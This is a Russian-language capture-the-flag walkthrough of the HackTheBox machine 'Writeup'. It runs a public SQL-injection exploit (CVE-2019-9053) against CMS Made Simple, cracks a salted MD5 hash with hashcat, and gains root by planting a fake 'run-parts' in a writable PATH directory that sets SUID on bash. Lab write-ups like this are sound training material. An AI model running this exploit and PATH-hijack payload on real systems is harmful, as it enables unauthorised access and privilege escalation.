# Writeup (2025)

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure></div>

## Тэги:

* CVE-2019-9053 (SQL Injection: CMS Made Simple)
* Bruteforce MD5 with salt
* Writable PATH abuses

## Разведка

При сканировании портов было обнаружено `2` открытых `tcp`-порта - `22` и `80`:

```shellscript
┌──(tragersec㉿hackandgtfo)-[~/HackTheBox/Writeup]
└─$ nmap -sC -sV 10.129.15.127 -oN nmap.out
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 20:56 MSK
Nmap scan report for 10.129.15.127
Host is up (0.051s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Nothing here yet.
| http-robots.txt: 1 disallowed entry 
|_/writeup/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds
```

На `80`-ом порту располагается следующая страница:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure></div>

В `robots.txt` можно обнаружить каталог `/writeup/`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure></div>

В нём содержатся страницы с инструкциями прохождения машин `HackTheBox`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure></div>

В исходном коде `HTML` было обнаружено, что используется `CMS Made Simple`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure></div>

## Получение первоначального доступа - jkr (SQL Injection: CVE-2019-9053)

На [exploit-db](https://www.exploit-db.com/) можно найти [эксплоит](https://www.exploit-db.com/exploits/46635) для этой `CMS` 2019 года:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure></div>

Код довольно старый, поэтому нужно использовать `python2`:

```shellscript
┌──(tragersec㉿hackandgtfo)-[~/HackTheBox/Writeup]
└─$ python2 46635       
Traceback (most recent call last):
  File "46635", line 12, in <module>
    from termcolor import colored
ImportError: No module named termcolor
```

Перед запуском следует установить несколько зависимостей. Чтобы это сделать в `python2` нужно скачать `get-pip.py` и затем запустить скрипт:

```shellscript
┌──(tragersec㉿hackandgtfo)-[~/Downloads]
└─$ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
--2025-12-16 06:36:45--  https://bootstrap.pypa.io/pip/2.7/get-pip.py
Resolving bootstrap.pypa.io (bootstrap.pypa.io)... 151.101.128.175, 151.101.0.175, 151.101.64.175, ...
Connecting to bootstrap.pypa.io (bootstrap.pypa.io)|151.101.128.175|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1908226 (1.8M) [text/x-python]
Saving to: ‘get-pip.py’

get-pip.py                                100%[====================================================================================>]   1.82M  5.22MB/s    in 0.3s    

2025-12-16 06:36:45 (5.22 MB/s) - ‘get-pip.py’ saved [1908226/1908226]

                                                                                                                                                                       
┌──(tragersec㉿hackandgtfo)-[~/Downloads]
└─$ sudo python2.7 get-pip.py
[sudo] password for tragersec: 
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting pip<21.0
  Downloading pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
     |████████████████████████████████| 1.5 MB 1.1 MB/s 
Collecting wheel
  Downloading wheel-0.37.1-py2.py3-none-any.whl (35 kB)
Installing collected packages: pip, wheel
Successfully installed pip-20.3.4 wheel-0.37.1
```

После установки модуля `pip2` можно скачать зависимости:

```shellscript
┌──(tragersec㉿hackandgtfo)-[~/HackTheBox/Writeup]
└─$ pip2 install setuptools
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting setuptools
  Downloading setuptools-44.1.1-py2.py3-none-any.whl (583 kB)
     |████████████████████████████████| 583 kB 1.2 MB/s 
Installing collected packages: setuptools
Successfully installed setuptools-44.1.1
                                                                                                                                                                       
┌──(tragersec㉿hackandgtfo)-[~/HackTheBox/Writeup]
└─$ pip2 install termcolor          
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting termcolor
  Using cached termcolor-1.1.0.tar.gz (3.9 kB)
Building wheels for collected packages: termcolor
  Building wheel for termcolor (setup.py) ... done
  Created wheel for termcolor: filename=termcolor-1.1.0-py2-none-any.whl size=4830 sha256=e859ff3a0d5db0d34a44cef3785523671e95eb4bbb8390d09d6643e978679c9a
  Stored in directory: /home/tragersec/.cache/pip/wheels/48/54/87/2f4d1a48c87e43906477a3c93d9663c49ca092046d5a4b00b4
Successfully built termcolor
Installing collected packages: termcolor
Successfully installed termcolor-1.1.0
```

И запустить эксплоит:

```shellscript
┌──(tragersec㉿hackandgtfo)-[~/HackTheBox/Writeup]
└─$ python2 46635 -u http://10.129.15.127/writeup
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

Поскольку хеш с солью, то нужно использовать специальный формат режим для Hashcat ([статья](https://hashcat.net/wiki/doku.php?id=example_hashes)):

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure></div>

Запуск брутфорса:

```shellscript
┌──(tragersec㉿hackandgtfo)-[~/HackTheBox/Writeup]
└─$ hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
<...вырезано...>
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
<...вырезано...>
```

Подключение по SSH, как jkr:

```shellscript
┌──(tragersec㉿hackandgtfo)-[~/HackTheBox/Writeup]
└─$ ssh jkr@10.129.15.127
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure></div>

## Повышение привилегий - root (Writable Path Abuses)

В выводе `LinPeas` было обнаружено, что пользователь jkr может создавать файлы в `/usr/local/bin` и `/usr/local/games`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure></div>

А в выводе `pspy64` при втором подключении по `SSH` выполняются следующие команды от лица суперпользователя:

{% code overflow="wrap" %}
```shellscript
2025/12/17 15:08:02 CMD: UID=0     PID=2549   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new

2025/12/17 15:08:02 CMD: UID=0     PID=2550   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new

2025/12/17 15:08:02 CMD: UID=0     PID=2551   | run-parts --lsbsysinit /etc/update-motd.d 
```
{% endcode %}

Поскольку у пользователя `jkr` есть права на запись в `/usr/local/bin`, то можно создать файл `run-parts` с полезной нагрузкой, выдать права на запуск и ещё раз подключиться по `SSH` из другого терминала и тем самым повысить свои привилегии:&#x20;

```shellscript
jkr@writeup:/usr/local/bin$ echo '#!/bin/bash' >> run-parts
jkr@writeup:/usr/local/bin$ echo 'chmod u+s /bin/bash' >> run-parts
jkr@writeup:/usr/local/bin$ chmod +x run-parts
```

Вторая сессия `SSH`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure></div>

С помощью полезной нагрузки был установлен `SUID` бит на `/bin/bash`. Теперь исполняемый файл оболочки можно запустить с опцией `-p`, чтобы повысить свои привилегии:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure></div>
